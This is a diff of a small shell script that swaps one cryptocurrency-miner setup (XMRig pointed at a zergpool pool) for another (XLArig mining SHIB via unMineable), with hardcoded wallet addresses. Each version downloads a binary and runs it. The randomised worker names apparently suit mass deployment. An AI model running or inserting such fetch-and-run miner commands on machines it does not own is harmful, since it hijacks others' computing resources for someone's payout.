@@ -1,5 +1,3 @@
-sudo apt update
-wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
-tar -xf xmrig-6.15.1-linux-x64.tar.gz
-cd xmrig-6.15.1
-./xmrig -a cryptonight-upx/2 -o stratum+tcp://cryptonight_upx.asia.mine.zergpool.com:4457 -u MB3ux2fkhJAcT94zayTTbSFJToCQcuRfGj.CPU-MT_RECEH-$(echo $(shuf -i 1-9999 -n 1)) -p c=LTC --asm=ryzen -t 5
+wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip
+unzip XLArig-v5.2.2-linux-x86_64.zip
+./xlarig -o rx-us.unmineable.com:13333 -u SHIB:0x49990f1e07e770fcf1d5e581e75d20c2e452e3a6#xuqq-86et -k -t 4
